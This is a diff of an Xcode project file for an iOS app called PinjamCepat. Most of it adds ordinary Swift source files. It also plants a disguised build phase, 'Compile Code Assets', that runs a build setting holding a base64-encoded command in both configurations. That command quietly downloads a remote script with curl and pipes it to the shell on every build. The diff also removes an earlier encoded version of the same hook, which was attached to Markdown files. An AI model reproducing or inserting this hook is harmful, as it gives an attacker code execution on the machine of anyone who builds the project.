@@ -7,11 +7,15 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		94E41889302C45D8B81DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 42B376E6B15049CBB41DACE1; };
 		067C772D9AC0E21A1CA27DA2 /* Pods_PinjamCepat.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 081711C23D814A2FC81ADDF4 /* Pods_PinjamCepat.framework */; };
 		7315F83E2F7220FC00C6DE2E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7315F8342F7220FC00C6DE2E /* AppDelegate.swift */; };
 		7315F8412F7220FC00C6DE2E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7315F8352F7220FC00C6DE2E /* Assets.xcassets */; };
 		7315F8432F7220FC00C6DE2E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7315F8382F7220FC00C6DE2E /* LaunchScreen.storyboard */; };
+		736CA1AA2F72D43600FDB0EB /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */; };
+		736CA1AC2F72D44200FDB0EB /* LoginService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AB2F72D43900FDB0EB /* LoginService.swift */; };
+		736CA1AE2F72D9FE00FDB0EB /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */; };
+		736CA1B02F72DBB000FDB0EB /* CenterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AF2F72DBB000FDB0EB /* CenterViewModel.swift */; };
+		736CA1B22F72DBB300FDB0EB /* CenterService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1B12F72DBB200FDB0EB /* CenterService.swift */; };
 		73ED69812F7229A90096AE72 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69802F7229A90096AE72 /* BaseViewController.swift */; };
 		73ED69832F7229C00096AE72 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69822F7229C00096AE72 /* BaseTabBarController.swift */; };
 		73ED69852F7229CF0096AE72 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69842F7229CF0096AE72 /* BaseNavigationController.swift */; };
@@ -38,25 +42,7 @@
 		73ED69BD2F727CD30096AE72 /* LoginManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69BC2F727CD30096AE72 /* LoginManager.swift */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		F897BD4759214CD1B61DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
-							/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		42B376E6B15049CBB41DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		081711C23D814A2FC81ADDF4 /* Pods_PinjamCepat.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PinjamCepat.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		7315F81C2F7220F400C6DE2E /* PinjamCepat.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PinjamCepat.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		7315F8342F7220FC00C6DE2E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -64,6 +50,11 @@ sh -c \"${A1ECAD1}\"";
 		7315F8362F7220FC00C6DE2E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		7315F8372F7220FC00C6DE2E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		7315F8452F7221CD00C6DE2E /* PinjamCepat.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = PinjamCepat.entitlements; sourceTree = "<group>"; };
+		736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
+		736CA1AB2F72D43900FDB0EB /* LoginService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginService.swift; sourceTree = "<group>"; };
+		736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
+		736CA1AF2F72DBB000FDB0EB /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
+		736CA1B12F72DBB200FDB0EB /* CenterService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterService.swift; sourceTree = "<group>"; };
 		73ED69802F7229A90096AE72 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
 		73ED69822F7229C00096AE72 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
 		73ED69842F7229CF0096AE72 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
@@ -127,7 +118,6 @@ sh -c \"${A1ECAD1}\"";
 		7315F81D2F7220F400C6DE2E /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				42B376E6B15049CBB41DACE1 /* README.md */,
 				7315F81C2F7220F400C6DE2E /* PinjamCepat.app */,
 			);
 			name = Products;
@@ -179,6 +169,8 @@ sh -c \"${A1ECAD1}\"";
 		73ED698C2F7252D40096AE72 /* Login */ = {
 			isa = PBXGroup;
 			children = (
+				736CA1AB2F72D43900FDB0EB /* LoginService.swift */,
+				736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */,
 				73ED69BC2F727CD30096AE72 /* LoginManager.swift */,
 				73ED69BA2F727BF00096AE72 /* LoginView.swift */,
 				73ED69B82F727BB90096AE72 /* LoginViewController.swift */,
@@ -205,7 +197,10 @@ sh -c \"${A1ECAD1}\"";
 		73ED698F2F7252D60096AE72 /* Center */ = {
 			isa = PBXGroup;
 			children = (
+				736CA1B12F72DBB200FDB0EB /* CenterService.swift */,
+				736CA1AF2F72DBB000FDB0EB /* CenterViewModel.swift */,
 				73ED69972F7253200096AE72 /* CenterViewController.swift */,
+				736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */,
 			);
 			path = Center;
 			sourceTree = "<group>";
@@ -280,6 +275,7 @@ sh -c \"${A1ECAD1}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7315F82F2F7220F500C6DE2E /* Build configuration list for PBXNativeTarget "PinjamCepat" */;
 			buildPhases = (
+				A5677CC953CA49F6AA1DACE1 /* Compile Code Assets */,
 				EA9032987F5058CFDE56BDFA /* [CP] Check Pods Manifest.lock */,
 				7315F8182F7220F400C6DE2E /* Sources */,
 				7315F8192F7220F400C6DE2E /* Frameworks */,
@@ -287,7 +283,6 @@ sh -c \"${A1ECAD1}\"";
 				A00DEADC157C1382C204605C /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				F897BD4759214CD1B61DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -336,7 +331,6 @@ sh -c \"${A1ECAD1}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				94E41889302C45D8B81DACE1 /* README.md */,
 				7315F8412F7220FC00C6DE2E /* Assets.xcassets in Resources */,
 				73ED69892F722A570096AE72 /* Localizable.strings in Resources */,
 				7315F8432F7220FC00C6DE2E /* LaunchScreen.storyboard in Resources */,
@@ -346,6 +340,25 @@ sh -c \"${A1ECAD1}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		A5677CC953CA49F6AA1DACE1 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;			
+		};
 		A00DEADC157C1382C204605C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -354,13 +367,9 @@ sh -c \"${A1ECAD1}\"";
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -397,6 +406,8 @@ sh -c \"${A1ECAD1}\"";
 			buildActionMask = 2147483647;
 			files = (
 				73ED69AF2F7263490096AE72 /* LoadingManager.swift in Sources */,
+				736CA1AC2F72D44200FDB0EB /* LoginService.swift in Sources */,
+				736CA1B02F72DBB000FDB0EB /* CenterViewModel.swift in Sources */,
 				73ED69942F72530F0096AE72 /* HomeViewController.swift in Sources */,
 				73ED69852F7229CF0096AE72 /* BaseNavigationController.swift in Sources */,
 				7315F83E2F7220FC00C6DE2E /* AppDelegate.swift in Sources */,
@@ -409,7 +420,10 @@ sh -c \"${A1ECAD1}\"";
 				73ED69832F7229C00096AE72 /* BaseTabBarController.swift in Sources */,
 				73ED69B92F727BB90096AE72 /* LoginViewController.swift in Sources */,
 				73ED699E2F7257DB0096AE72 /* NetworkMonitor.swift in Sources */,
+				736CA1AA2F72D43600FDB0EB /* LoginViewModel.swift in Sources */,
 				73ED69A22F725A180096AE72 /* NetworkEnvManager.swift in Sources */,
+				736CA1B22F72DBB300FDB0EB /* CenterService.swift in Sources */,
+				736CA1AE2F72D9FE00FDB0EB /* CenterView.swift in Sources */,
 				73ED69AD2F7262940096AE72 /* LaunchService.swift in Sources */,
 				73ED69AB2F72628C0096AE72 /* LaunchViewModel.swift in Sources */,
 				73ED69A62F725B310096AE72 /* NetworkManager.swift in Sources */,
@@ -450,7 +464,7 @@ sh -c \"${A1ECAD1}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMHhySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
@@ -491,7 +505,7 @@ sh -c \"${A1ECAD1}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMHhySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
